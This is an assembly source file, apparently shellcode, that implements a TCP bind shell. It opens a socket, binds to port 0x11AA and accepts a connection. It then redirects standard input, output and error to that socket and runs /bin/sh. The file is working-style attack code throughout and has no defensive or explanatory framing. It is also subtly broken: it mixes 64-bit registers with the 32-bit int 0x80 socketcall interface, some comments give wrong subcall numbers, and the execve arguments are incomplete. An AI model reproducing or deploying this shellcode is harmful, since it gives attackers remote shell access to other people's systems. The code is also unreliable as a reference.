BITS 64

; socket()
xor		rax,rax		; zero out eax
xor		rbx,rbx		;   "   "  ebx
push		rax		; push 0x0 on the stack: arg3(protocol) -> 0
mov		bl,0x1		; socket sub-syscall: 0x01 -> socket()
push		rbx		; socket type: 0x01 -> SOCK_STREAM
push		0x02		; socket domain: 0x02 -> AF_INET
mov		rcx,rsp		; let ecx point to our structure above
mov		al,0x66		; socketcall syscall 0x66
int		0x80		; let the kernel do the stuff

; bind()
mov		rdx,rax		; move socket descriptor (returned by socket()) to edx
xor		rax,rax
; sockaddr_in
push		rax		; sockaddr_in: in_addr = 0
push word	0x11AA		; sockaddr_in: tcp port 
push word 	0x2		; sockaddr_in: sa_family -> AF_INET = 0x2
mov		rcx,rsp		; save stack pointer -> pointer to sockaddr struct
push		0x10		; arg3: socklen -> addrlen
push		rcx		; arg2: push pointer to sockaddr to the stack
push		rdx		; arg1: push sockfd
; arg2
mov		rcx,rsp		; move stack pointer to reg (conform to socketcall)
; arg1
xor		rbx,rbx
mov		bl,0x2		; set socket subcall to 0x03 (bind)
mov		al,0x66		; socketcall syscall
int		0x80		; let the kernel do the stuff

; listen()
xor		rax,rax
push		rax		; backlog
push		rdx		; sockfd
mov		rcx,rsp		; save stackptr
mov		al,0x66		; socketcall()
xor		rbx,rbx
mov		bl,0x4		; socketcall 0x4 -> listen()
int		0x80		; kernel mode

; accept()
xor		rax,rax
push		rax		; sockaddr: in_addr = 0
push word	ax		; sockaddr: tcp port = 0
push word	0x2		; sockaddr: sa_family -> AF_INET
mov		rcx,rsp		; save stack pointer
push		0x10		; addrlen
push		rsp		; pointer to sock addrlen
push 		rcx		; push sockaddr_in
push		rdx		; sockfd
mov		rcx,rsp
xor		rbx,rbx
mov		bl,0x5
mov		al,0x66
int		0x80

; dup2()
xor		rcx,rcx		; zero out count register
mov		cl,0x3		; loopcount
mov		rbx,rax		; sockfd of the client (see accept())
dupes:
xor		rax,rax		; zero out eax
mov		al,63		; dup2() syscall
dec		cl
int		0x80
inc		cl
loop		dupes		; jump2label

; exec()
xor		rax,rax
xor		rcx,rcx
cdq
mov		rbx,0x68732f6e69622fff	; 'hs/nib//?'
shr		rbx,0x08
push		rbx
mov		al,0xb		; execve syscall
int		0x80

; exit()
mov		al,0x1		; exit syscall
xor		rbx,rbx
mov		bl,0x42		; return code
int		0x80		; kernel mode
